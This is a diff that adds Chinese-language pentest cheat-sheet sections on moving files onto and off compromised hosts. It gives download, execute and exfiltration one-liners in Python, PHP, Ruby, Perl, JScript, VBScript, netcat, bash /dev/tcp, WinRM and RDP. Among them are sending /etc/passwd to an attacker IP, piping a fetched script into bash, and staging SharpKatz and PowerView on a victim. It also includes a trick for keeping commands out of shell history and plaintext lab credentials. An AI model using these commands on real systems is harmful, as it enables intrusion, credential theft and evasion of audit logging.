@@ -720,3 +720,187 @@ ruby
 ruby -run -ehttpd . -p8000
 ```
 
+## 5.3 使用代码传输文件
+
+**python2下载**
+
+```
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+**python3下载**
+
+```
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+[ 根据 W3Techs 的数据 ](https://w3techs.com/technologies/details/pl-php)，77.4% 的网站都使用 PHP
+
+**python3上传**
+
+```
+python3 -m uploader #启用upload模块
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+**php使用File_get_contents（） 下载** 
+
+```shell-session
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+```
+
+`file_get_contents（）` 和 `file_put_contents（）` 的替代方案是 [fopen（） 模块](https://www.php.net/manual/en/function.fopen.php)
+
+**php使用fopen（） 下载** 
+
+```shell-session
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+
+**PHP 下载文件并将其通过管道传输到 Bash**
+
+```shell-session
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+**Ruby下载文件**
+
+```
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+
+**Perl 下载文件**
+
+```shell-session
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+**JavaScript**
+
+创建一个名为wget.js的文件
+
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+```cmd-session
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+**VBscript**
+
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+```cmd-session
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+## 5.4 使用其他方式传输文件
+
+### 5.4.1 nc/netcat/ncat
+
+（1)**反向连接：**被攻击机，侦听端口8000
+
+```
+nc -l -p 8000 > SharpKatz.exe
+或ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+
+攻击机，传输文件
+
+```
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+或ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+
+<img src="\image-20250515101304582.png" alt="image-20250515101304582" style="zoom:50%;" />
+
+如果防火墙限制了入站，不适用。
+
+有一个小技巧 history不记录历史命令，【不是指~/.bash_history】可以在输入命令的时候前面加一个空格
+
+
+
+2）**正向连接**：攻击机
+
+```
+nc -l -p 8000 < SharpKatz.exe
+或sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+被攻击机
+
+```
+nc 192.168.49.128 443 > SharpKatz.exe
+或ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+
+3）如果没有nc，**利用bash**
+
+正向连接，被攻击机
+
+```
+cat </dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+### 5.4.2 powershell
+
+如果HTTP、HTTPS、SMB不可用，可以尝试WinRM。
+
+确认 WinRM 端口 TCP 5985 在 DATABASE01 上打开
+
+```
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+```
+
+创建 PowerShell 远程处理会话以 DATABASE01
+
+```
+$Session = New-PSSession -ComputerName DATABASE01 
+```
+
+```
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+```
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+
+
+### 5.4.3 rdp
+
+使用 rdesktop 挂载 Linux 文件夹
+
+```shell-session
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+
+使用 xfreerdp 挂载 Linux 文件夹
+
+```
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+
